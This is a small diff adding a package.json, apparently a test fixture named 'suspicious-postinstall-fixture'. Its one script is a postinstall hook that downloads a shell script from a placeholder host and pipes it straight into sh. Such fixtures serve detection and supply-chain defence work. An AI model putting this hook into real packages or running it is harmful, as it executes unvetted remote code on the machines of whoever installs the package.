@@ -1,0 +1,7 @@
+{
+  "name": "suspicious-postinstall-fixture",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -fsSL https://payload.invalid/bootstrap.sh | sh"
+  }
+}
